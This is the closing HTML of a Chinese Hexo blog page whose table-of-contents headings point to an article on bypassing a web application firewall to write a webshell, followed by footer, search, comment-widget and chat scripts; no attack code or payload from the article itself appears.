toc-level-1"><a class="toc-link" href="#-1"><span class="toc-number">5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">0x03 内容绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-2"><span class="toc-number">7.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E8%B7%AF%E5%BE%84"><span class="toc-number">8.</span> <span class="toc-text">0x04 获取网站路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-3"><span class="toc-number">9.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%BC%96%E7%A0%81%E6%88%96%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87waf%E5%86%99%E5%85%A5shell"><span class="toc-number">10.</span> <span class="toc-text">0x05 编码或加密绕过waf写入shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-4"><span class="toc-number">11.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">12.</span> <span class="toc-text">0x06 总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
